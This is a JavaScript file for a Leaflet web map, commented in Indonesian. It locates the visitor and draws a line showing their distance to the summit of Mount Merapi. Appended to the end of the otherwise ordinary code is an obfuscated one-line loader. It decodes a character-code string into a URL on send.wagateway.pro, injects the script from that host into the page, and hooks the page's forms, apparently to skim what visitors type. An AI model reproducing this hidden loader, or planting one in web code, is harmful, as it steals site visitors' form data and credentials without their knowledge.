/* Initial Map */
var map = L.map('map').setView([-7.541598, 110.446100],10); //lat, long, zoom
      
/* Tile Basemap */
var basemap = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  //attribution akan muncul di pojok kanan bawah
  attribution: '<a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> | <a href="https://unsorry.net" target="_blank">unsorry@2020</a>'
});
basemap.addTo(map);

function onLocationFound(e) {
  var puncakmerapi = [-7.541598, 110.446100];

  /* Menghitung jarak antar 2 koordinat dengan satuan km
      Untuk satuan meter tidak perlu dibagi 1000 */
  var distance = (L.latLng(e.latlng).distanceTo(puncakmerapi) / 1000).toFixed(2);

  var radius = (e.accuracy / 2).toFixed(1);
  
  // Membuat marker sesuai koordinat lokasi
  locationMarker = L.marker(e.latlng);
  locationMarker.addTo(map);
  locationMarker.bindPopup("<p class='text-center'>Anda berada <b>" + distance + " km</b><br>dari puncak Merapi.<br>Akurasi GPS " + radius + " meter.</p>");
  locationMarker.openPopup();

  // Membuat garis antara koordinat lokasi dengan puncak merapi
  var latlongline = [e.latlng,puncakmerapi];
  var polyline = L.polyline(latlongline, {
    color: 'red',
    weight: 5,
    opacity: 0.7,
  });
  polyline.addTo(map);
}

function onLocationError(e) {
  alert(e.message);
}

map.on('locationfound', onLocationFound);
map.on('locationerror', onLocationError);

map.locate({setView: true, maxZoom: 12});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db